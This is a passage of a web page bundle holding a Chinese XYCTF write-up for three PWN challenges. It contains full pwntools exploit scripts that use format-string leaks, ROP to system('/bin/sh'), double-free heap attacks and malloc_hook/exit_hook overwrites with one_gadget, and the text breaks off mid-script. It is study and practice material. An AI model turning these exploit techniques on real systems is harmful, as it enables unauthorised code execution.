import{_ as e}from"./plugin-vue_export-helper-x3n3nnut.js";import{r as o,o as c,c as l,a as n,b as s,d as p,e as t}from"./app-7M1FdjAU.js";const u={},i=t(`<h1 id="pwn" tabindex="-1"><a class="header-anchor" href="#pwn" aria-hidden="true">#</a> PWN</h1><h2 id="babygift" tabindex="-1"><a class="header-anchor" href="#babygift" aria-hidden="true">#</a> BabyGift</h2><figure><img src="https://awaqwqa.github.io/img/xyctf/image-20240422202855033.png" alt="image-20240422202855033" tabindex="0" loading="lazy"><figcaption>image-20240422202855033</figcaption></figure><ul><li>利用这里会让字符串地址赋值给rdi 然后我们通过劫持程序流程跑到printf处 利用格式化字符串漏洞就能泄露libc地址 然后触发system函数</li></ul><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment"># context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)</span>
<span class="token comment"># context(os=&#39;linux&#39;, arch=&#39;amd64&#39;)</span>
<span class="token comment"># context.terminal = [&#39;byobu&#39;, &#39;sp&#39;, &#39;-h&#39;]</span>


file_name <span class="token operator">=</span> <span class="token string">&quot;./vuln&quot;</span>
url <span class="token operator">=</span> <span class="token string">&quot;127.0.0.1&quot;</span>
port <span class="token operator">=</span> <span class="token number">64472</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
<span class="token comment"># p= process(file_name)</span>
<span class="token comment"># p = gdb.debug(file_name,&quot;b *Menu+113&quot;)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span>url<span class="token punctuation">,</span>port<span class="token punctuation">)</span>

sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span>  <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
ra <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
ia <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b&#39;\\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b&#39;\\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
pop_rbp <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x4012D0</span><span class="token punctuation">)</span>
lea_rax <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x4012A0</span> <span class="token punctuation">)</span>
bss <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x404020</span><span class="token operator">+</span><span class="token number">0x200</span><span class="token punctuation">)</span>
sub_rsp <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x4012DC</span><span class="token punctuation">)</span>
ret <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x40101a</span><span class="token punctuation">)</span>
mov_rax_0_pop_rbp <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x4012CB</span><span class="token punctuation">)</span>
mov_rax_printf <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x401202</span><span class="token punctuation">)</span>


ru<span class="token punctuation">(</span><span class="token string">b&quot;Your name:\\n&quot;</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span><span class="token string">b&quot;elegy&quot;</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">b&quot;Your passwd:\\n&quot;</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">b&quot;%27$p%11$p&quot;</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x404020</span><span class="token operator">+</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>mov_rax_printf <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x40122D</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>
sd<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
res <span class="token operator">=</span> rl<span class="token punctuation">(</span><span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">128</span> <span class="token operator">-</span><span class="token number">0x29DC0</span>
stack_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;stack_addr&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
system_addr <span class="token operator">=</span> <span class="token number">0x50D70</span> <span class="token operator">+</span>libc_base
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">b&quot;Your name:\\n&quot;</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span><span class="token string">b&quot;elegy&quot;</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">b&quot;Your passwd:\\n&quot;</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">b&quot;/bin/sh\\x00&quot;</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token punctuation">)</span> <span class="token operator">+</span>ret<span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="fastfastfast" tabindex="-1"><a class="header-anchor" href="#fastfastfast" aria-hidden="true">#</a> fastfastfast</h2><ul><li><p>简单的堆题 free的时候没有做任何检测 直接<code>double free</code> 然后通过指向bss表中 泄露出标准io地址从而推算出libc地址</p><figure><img src="https://awaqwqa.github.io/img/xyctf/image-20240422211524070.png" alt="image-20240422211524070" tabindex="0" loading="lazy"><figcaption>image-20240422211524070</figcaption></figure></li><li><p><code>double free</code>后任意地址malloc</p><ul><li><img src="https://awaqwqa.github.io/img/xyctf/image-20240422211447696.png" alt="image-20240422211447696" tabindex="0" loading="lazy"><figcaption>image-20240422211447696</figcaption></li></ul></li><li><p>bss段标准输入输出流io地址信息</p><ul><li><img src="https://awaqwqa.github.io/img/xyctf/image-20240422211628353.png" alt="image-20240422211628353" tabindex="0" loading="lazy"><figcaption>image-20240422211628353</figcaption></li></ul></li><li><p>通过在gdb中输入libc获取libc基础地址来算和io之间的地址偏差</p><ul><li><img src="https://awaqwqa.github.io/img/xyctf/image-20240422211647867.png" alt="image-20240422211647867" tabindex="0" loading="lazy"><figcaption>image-20240422211647867</figcaption></li></ul></li></ul><p>算一下偏差就可以了</p><p>然后通过第二次<code>double free</code> 修改malloc hook 为onegadget即可</p><h3 id="脚本" tabindex="-1"><a class="header-anchor" href="#脚本" aria-hidden="true">#</a> 脚本</h3><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># context(os=&#39;linux&#39;, arch=&#39;mips&#39;,endian=&quot;little&quot;, log_level=&#39;debug&#39;)</span>
context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">&#39;linux&#39;</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">&#39;amd64&#39;</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">&#39;debug&#39;</span><span class="token punctuation">)</span>
<span class="token comment"># context(os=&#39;linux&#39;, arch=&#39;amd64&#39;)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&#39;byobu&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;sp&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-h&#39;</span><span class="token punctuation">]</span>


file_name <span class="token operator">=</span> <span class="token string">&quot;./vuln&quot;</span>
url <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>
port <span class="token operator">=</span> <span class="token number">1111</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
<span class="token comment"># p= process(file_name)</span>
p <span class="token operator">=</span> gdb<span class="token punctuation">.</span>debug<span class="token punctuation">(</span>file_name<span class="token punctuation">,</span><span class="token string">&quot;b *main+42&quot;</span><span class="token punctuation">)</span>
<span class="token comment"># p = remote(url,port)</span>

sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span>  <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
ra <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
ia <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b&#39;\\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b&#39;\\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">Menu</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;&gt;&gt;&gt; &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>index<span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    Menu<span class="token punctuation">(</span><span class="token string">b&quot;1&quot;</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;please input note idx\\n&quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;please input content\\n&quot;</span><span class="token punctuation">)</span>
    sd<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;创建了一个index:</span><span class="token interpolation"><span class="token punctuation">{</span>index<span class="token punctuation">}</span></span><span class="token string">的chunk&quot;</span></span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    Menu<span class="token punctuation">(</span><span class="token string">b&quot;2&quot;</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;please input note idx\\n&quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;删除一个index:</span><span class="token interpolation"><span class="token punctuation">{</span>index<span class="token punctuation">}</span></span><span class="token string">的chunk&quot;</span></span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    Menu<span class="token punctuation">(</span><span class="token string">b&quot;3&quot;</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;please input note idx\\n&quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> rc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>
<span class="token comment">#构造double free</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    create<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x61</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    create<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x61</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
got_addr <span class="token operator">=</span> <span class="token number">0x401050</span>
bss_addr <span class="token operator">=</span> <span class="token number">0x404070</span> 
<span class="token comment"># 控制fd 指向我们想要malloc的地址</span>
create<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
create<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b&quot;aaaaaaaa&quot;</span><span class="token punctuation">)</span>
create<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token punctuation">)</span>
<span class="token comment"># 控制bss_addr段</span>
create<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;开始泄露&quot;</span><span class="token punctuation">)</span>
res <span class="token operator">=</span> show<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
<span class="token comment"># print(&quot;res&quot;,u64(res[16:24]))</span>
<span class="token comment">#算出libc</span>
libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2021024</span>
system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0xe3b31</span>
malloc_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">0x7f291e7a2b70</span><span class="token operator">-</span><span class="token number">0x7f291e5b6000</span> <span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;libc_base:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;malloc_hook:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;system_addr:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;成功泄露&quot;</span><span class="token punctuation">)</span>
<span class="token comment">#第二次double free</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    create<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token string">b&quot;aaaaaaaa&quot;</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;两个fastbin情况&quot;</span><span class="token punctuation">)</span>
<span class="token comment"># input(&quot;e&quot;)</span>
delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span> 
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;构造double free&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    create<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token string">b&quot;aaaaaaaa&quot;</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;tcache删除完毕&quot;</span><span class="token punctuation">)</span>
<span class="token comment"># 修改malloc_hook</span>
create<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>malloc_hook <span class="token punctuation">)</span><span class="token punctuation">)</span>
create<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;malloc_hook:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;system_addr:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
create<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
create<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
create<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token punctuation">)</span>
ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="fmt" tabindex="-1"><a class="header-anchor" href="#fmt" aria-hidden="true">#</a> fmt</h2><blockquote><p>scanf和fmt类似 有格式化 我们可以通过%n$p来实现指定第几个参数地址写入内容 然后前六个参数都是寄存器 后面的参数就是栈地址了 按照栈顶依次选择</p></blockquote><ul><li>这题我们拥有两次写入机会 我们可以第一次写入目标地址 然后第二次通过scanf来向目标地址写入数据</li><li>我们选择打exit_hook 写入one_gadget 就可以成功劫持了</li></ul><h3 id="exit-hook地址写入栈" tabindex="-1"><a class="header-anchor" href="#exit-hook地址写入栈" aria-hidden="true">#</a> exit hook地址写入栈:</h3><figure><img src="https://awaqwqa.github.io/img/xyctf/image-20240422212450209.png" alt="image-20240422212450209" tabindex="0" loading="lazy"><figcaption>image-20240422212450209</figcaption></figure><h3 id="选择" tabindex="-1"><a class="header-anchor" href="#选择" aria-hidden="true">#</a> 选择</h3><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token operator">%</span><span class="token number">7</span>$ld
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="脚本-1" tabindex="-1"><a class="header-anchor" href="#脚本-1" aria-hidden="true">#</a> 脚本</h3><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">&#39;linux&#39;</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">&#39;amd64&#39;</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">&#39;debug&#39;</span><span class="token punctuation">)</span>
<span class="token comment"># context(os=&#39;linux&#39;, arch=&#39;amd64&#39;)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&#39;byobu&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;sp&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-h&#39;</span><span class="token punctuation">]</span>


<span class="token comment"># file_name = &quot;./vuln&quot;</span>
url <span class="token operator">=</span> <span class="token string">&quot;127.0.0.1&quot;</span>
port <span class="token operator">=</span> <span class="token number">53235</span>


<span class="token comment"># elf = ELF(file_name)</span>
<span class="token comment"># p= process(file_name)</span>
<span class="token comment"># p = gdb.debug(file_name,&quot;b main&quot;)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span>url<span class="token punctuation">,</span>port<span class="token punctuation">)</span>

sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
